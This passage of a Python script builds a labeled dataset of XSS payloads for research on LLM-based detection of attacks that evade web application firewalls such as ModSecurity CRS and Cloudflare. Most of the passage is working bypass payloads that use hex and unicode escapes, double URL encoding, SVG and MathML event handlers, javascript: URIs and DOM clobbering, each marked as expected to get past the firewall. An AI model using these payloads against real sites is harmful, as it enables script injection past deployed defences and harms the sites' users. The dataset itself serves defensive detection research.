    ("[]['\\x66\\x69\\x6c\\x74\\x65\\x72']['\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72']('a\\x6c\\x65\\x72\\x74(1)')()", True, "valid", "Hex-encoded Array prototype chain evasion."),
    
    # 2. Bypassing atob/eval blocks via self and context
    ("<svg onload=self['\\x65\\x76\\x61\\x6c'](self['\\x61\\x74\\x6f\\x62']('YWxlcnQoMSk='))>", True, "valid", "Hex encoded eval and atob calls hiding base64 payload."),
    
    # 3. Super Exotic Attributes
    ("<animateTransform onbegin=alert(1) attributeName=transform>", True, "valid", "SVG animateTransform tag onbegin."),
    ("<discard onbegin=alert(1)>", True, "valid", "SVG discard element onbegin event."),
    ("<set onbegin=alert(1) attributeName=x to=1>", True, "valid", "SVG set element onbegin event."),
    
    # 4. Multi-layered Obfuscation (Location assignment with unicode + url encoding)
    ("<a href=\"javascript&colon;\\u0061\\u006c\\u0065\\u0072\\u0074(1)\">click</a>", True, "valid", "HTML Entity colon + Unicode alert."),
    ("<a href=\"javas%0Acript:alert(1)\">click</a>", True, "valid", "URL encoded newline injected inside javascript keyword."),
    ("<a href=\"javas%09cript:alert(1)\">click</a>", True, "valid", "URL encoded tab injected inside javascript keyword."),
    
    # 5. Overwriting toString
    ("<svg onload=\"x={toString:function(){return'alert(1)'}};setTimeout(x,0)\">", True, "valid", "setTimeout via overloaded toString on object."),
    
    # 6. Throw / Delete / Void chaining (Syntax anomaly)
    ("<img src=x onerror=\"throw delete~void\\x20alert(1)\">", True, "valid", "Chaining keywords throw, delete, void with hex space."),
    
    # 7. Exotic URI Schemes parsing differential
    ("<object data=\"javascrip\\t:alert(1)\">", True, "valid", "Tab inside object data javascript URI."),
    
    # 8. XSS via CSS Expressions (Old IE but good for WAF confusion)
    ("<div style=\"x:expression(alert(1))\">", True, "valid", "CSS Expression with no spaces."),
    ("<style>@import 'javascript:alert(1)';</style>", True, "valid", "CSS import JS execution."),
    
    # 9. HTML Entity Without Semicolons
    ("<svg onload=&#97&#108&#101&#114&#116(1)>", True, "valid", "HTML Entities without semicolons are parsed by browsers but often missed by WAFs."),
    
    # 10. MathML context breaking
    ("<math><mi><code><style><![CDATA[</style><img src=x onerror=alert(1)>]]></code></mi></math>", True, "valid", "CDATA inside MathML styles to confuse parser state."),
    
    # 11. Bypassing parentheses limits using string templates
    ("<img src=x onerror=setTimeout`alert\\x281\\x29`>", True, "valid", "Backticks for setTimeout and hex for parentheses inside the string."),
    
    # 12. Double URL encoding of EVERYTHING
    ("%25%33%43%25%73%25%76%25%67%25%20%25%6f%25%6e%25%6c%25%6f%25%61%25%64%25%3d%25%61%25%6c%25%65%25%72%25%74%25%28%25%31%25%29%25%3e", True, "valid", "Total Double URL Encode of <svg onload=alert(1)>"),
    
    # 13. Deep JS obfuscation (Hieroglyphy style)
    ("(![]+[])[+[]]", False, "invalid", "Just symbol obfuscation (yields 'f', safe to check response limit, not executable on its own)"),
    
    # ---------------------------------------------------------
    # PART 2: EXPANDED DOUBLE ENCODING & SYNTAX ANOMALIES
    # ---------------------------------------------------------
    
    # Double Encoding variants on exotic tags (WAF catches <script> even double encoded sometimes, but not exotic ones)
    ("%253Cmath%253E%253Cmi%252F%252Fonload%253Dalert%25281%2529%253E", True, "valid", "Double URL Encoded MathML"),
    ("%253Ctable%2520background%253D%2522javascript%253Aalert%25281%2529%2522%253E", True, "valid", "Double URL Encoded table background inline JS"),
    ("%253Cobject%2520data%253D%2522data%253Atext%252Fhtml%253Bbase64%252CPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg%253D%253D%2522%253E", True, "valid", "Double URL Encoded Object Data with Base64 interior"),
    ("%253Ciframe%2520srcdoc%253D%2522%2526lt%253Bimg%2520src%253Dx%2520onerror%253Dalert%25281%2529%2526gt%253B%2522%253E", True, "valid", "Double URL Encoded iframe srcdoc with HTML entities inside"),
    ("%253Cform%2520id%253Dtest%253E%253Cbutton%2520id%253Dx%253E%253C%252Fbutton%253E%253C%252Fform%253E%253Cscript%253Ealert%2528test.x.id%2529%253C%252Fscript%253E", True, "valid", "Double URL Encoded DOM Clobbering vector"),
    
    # Double Encoding with Mixed Case and Whitespace anomalies
    ("%253CdEtAiLs%250Aopen%250Aontoggle%253Dalert%25281%2529%253E", True, "valid", "Double Encode + Mixed Case + Form Feed/Newline"),
    ("%253Cimg%252Fsrc%253Dx%252Fonerror%253Dalert%25281%2529%253E", True, "valid", "Double Encode + Slash separated attributes"),
    
    # Extreme Syntax Anomalies (JS parsing differentials)
    ("<img src=x onerror=\"throw~delete~void\\x20alert(1)\">", True, "valid", "Syntax anomaly combining throw, delete, void, and hex space"),
    ("<img src=x onerror=\"throw'';delete~void\\x09alert(1)\">", True, "valid", "Syntax anomaly with throw empty string, delete, void, and tab"),
    ("<img src=x onerror=\"!+~-typeof\\x0balert(1)\">", True, "valid", "Unary operator extreme chaining avoiding parentheses and equals"),
    ("<img src=x onerror=\"void'';typeof~\\x0calert(1)\">", True, "valid", "Void empty string followed by typeof and form feed"),
    ("<svg onload=\"throw/**/alert(1)\">", True, "valid", "Throw keyword bypassing function call checks with inline comment"),
    ("<svg onload=\"delete/**/alert(1)\">", True, "valid", "Delete keyword bypassing checks with inline comment"),
    
    # Combinations: Syntax Anomaly + Protocol Obfuscation + Hex/Unicode
    ("<a href=\"javascrip\\u0074:throw~delete~\\x61\\x6c\\x65\\x72\\x74(1)\">click</a>", True, "valid", "Unicode protocol + JS keywords + Hex alert"),
    ("<iframe src=\"javascript:!+~-typeof\\x20\\u0061\\u006c\\u0065\\u0072\\u0074(1)\"></iframe>", True, "valid", "Iframe JS protocol + unary chain + hex space + unicode alert"),
    
    # Double Encoding of Syntax Anomalies (The ultimate combination)
    ("%253Cimg%2520src%253Dx%2520onerror%253D%2522throw~delete~void%255Cx20alert%25281%2529%2522%253E", True, "valid", "Double encoded Throw/Delete/Void anomaly"),
    ("%253Csvg%2520onload%253D%2522delete%252F%252A%252A%252Falert%25281%2529%2522%253E", True, "valid", "Double encoded delete + inline comment anomaly"),
]

for p, bypass, lbl, r in extreme_bypasses:
    add(p, "Extreme Evasion", "ModSec CRS繞過", "Mixed", bypass, lbl, r)


# ============================================================================
# OUTPUT GENERATION
# ============================================================================

def generate_outputs():
    raw_path = os.path.join(OUTPUT_DIR, "xss_payloads_raw.txt")
    json_path = os.path.join(OUTPUT_DIR, "xss_dataset_labeled.json")

    # Write raw payloads
    with open(raw_path, "w", encoding="utf-8") as f:
        for entry in payloads_data:
            # Replace newlines with literal \n for raw file (one payload per line)
            safe_payload = entry["payload"].replace('\n', '\\n').replace('\r', '\\r')
            f.write(safe_payload + "\n")

    # Write labeled dataset
    with open(json_path, "w", encoding="utf-8") as f:
        json.dump(payloads_data, f, ensure_ascii=False, indent=2)

    # Print statistics
    total = len(payloads_data)
    valid_count = sum(1 for e in payloads_data if e["label"] == "valid")
    invalid_count = total - valid_count
    valid_pct = (valid_count / total) * 100 if total else 0
    invalid_pct = (invalid_count / total) * 100 if total else 0

    print(f"{'=' * 65}")
    print(f"  Extended XSS Payload Dataset Generator - Output Summary")
    print(f"{'=' * 65}")
    print(f"  Total payloads generated: {total}")
    print(f"  Valid:   {valid_count} ({valid_pct:.1f}%)")
    print(f"  Invalid: {invalid_count} ({invalid_pct:.1f}%)")
    print()

    # Breakdown by encoding type
    enc_types = {}
    for e in payloads_data:
        et = e["encoding_type"]
        if et not in enc_types:
            enc_types[et] = {"valid": 0, "invalid": 0}
        enc_types[et][e["label"]] += 1

    print(f"  {'Encoding Type':<35} {'Valid':>6} {'Invalid':>8} {'Total':>6}")
    print(f"  {'-' * 60}")
    for et, counts in enc_types.items():
        t = counts["valid"] + counts["invalid"]
        print(f"  {et:<35} {counts['valid']:>6} {counts['invalid']:>8} {t:>6}")

    # Breakdown by scenario
    scenarios = {}
    for e in payloads_data:
        sc = e["scenario"]
        if sc not in scenarios:
            scenarios[sc] = 0
        scenarios[sc] += 1

    print(f"\n  Scenario breakdown:")
    for sc, count in scenarios.items():
        print(f"    {sc}: {count}")

    print(f"\n  Output files:")
    print(f"    Raw payloads:     {raw_path}")
    print(f"    Labeled dataset:  {json_path}")
    print(f"{'=' * 65}")


if __name__ == "__main__":
    generate_outputs()


# ===========================================================================
# DATASET CONSTRUCTION NOTES (for citation in academic papers)
# ===========================================================================
#
# Dataset Construction Methodology
# ---------------------------------
# This extended dataset was constructed to support research on using Large
# Language Models (LLMs) for automated detection and classification of
# Cross-Site Scripting (XSS) attacks, with specific focus on WAF evasion
# techniques targeting Cloudflare and ModSecurity CRS rulesets.
#
# 1. DATA SOURCES
#    The dataset combines three sources:
#    (a) Expert-crafted payloads: Manually designed XSS vectors with
#        specific encoding transformations and WAF bypass techniques
#    (b) Automated encoding permutations: Systematic application of 10+
#        encoding schemes across base payloads to generate diverse variants
#    (c) Academic dataset integration: Payloads from prior thesis research
#        including PortSwigger XSS cheat sheet and HttpParams datasets
#
# 2. ENCODING CATEGORIES
#    - Raw/Unencoded, URL Encoding, Double URL Encoding
#    - HTML Entity (decimal & hex), Unicode/Hex JS escapes
#    - Base64 (eval/atob and data: URIs), Mixed Encoding
#    - Mixed Case, Whitespace/Tab/Newline Insertion
#    - Segmented/Context-Breaking Injection
#    - JavaScript Protocol Variations, JS Obfuscation Techniques
#    - Polyglot Payloads
#
# 3. LABELING CRITERIA
#    "valid": Browser can parse and execute the payload AND the encoding
#    technique is expected to evade the target WAF
#    "invalid": WAF blocks it, encoding is incorrect for context, browser
#    rejects the syntax, or the element/API is deprecated
#
# 4. WAF TESTING METHODOLOGY
#    Payloads are tested against ModSecurity CRS with OWASP ruleset at
#    PARANOIA level 2, measuring actual block/pass rates to validate labels
#
# ===========================================================================
